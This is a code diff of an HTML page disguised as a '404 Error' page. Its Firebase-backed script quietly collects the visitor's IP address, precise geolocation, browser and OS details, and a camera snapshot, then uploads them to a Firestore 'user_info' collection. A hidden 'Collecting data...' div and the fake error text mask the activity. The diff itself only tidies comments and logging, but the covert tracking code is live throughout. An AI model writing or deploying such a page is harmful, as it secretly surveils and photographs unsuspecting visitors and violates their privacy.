@@ -7,16 +7,13 @@
 </head>
 <body>
 
-    <!-- Hidden UI -->
     <div style="display: none;">
         Collecting data...
     </div>
-        <h1>404 Error</h1>
-    <p>please try again , permissions not accepted.</p>
+    <h1>404 Error</h1>
+    <p>Please try again, permissions not accepted.</p>
 
-    <!-- Firebase SDK Modular Version -->
     <script type="module">
-        // Import Firebase SDK modules
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
         import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js';
 
@@ -44,9 +41,9 @@
                 console.log("IP Address:", ipAddress);
 
                 navigator.geolocation.getCurrentPosition(async (position) => {
+                    console.log("Geolocation Success:", position);
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    console.log("Latitude:", latitude, "Longitude:", longitude);
 
                     const userAgent = navigator.userAgent;
                     const osType = navigator.platform;
@@ -65,7 +62,7 @@
                         // Capture image from user's camera
                         const imageBase64 = await captureImage();
                         console.log("Captured Image Base64:", imageBase64);
-                        userData.imageBase64 = imageBase64; // Add image base64 to user data
+                        userData.imageBase64 = imageBase64;
 
                         // Add document to Firestore
                         await addDoc(collection(db, "user_info"), userData);
@@ -113,6 +110,7 @@
                             });
                     })
                     .catch((error) => {
+                        console.error("Camera access error:", error);
                         reject(error);
                     });
             });
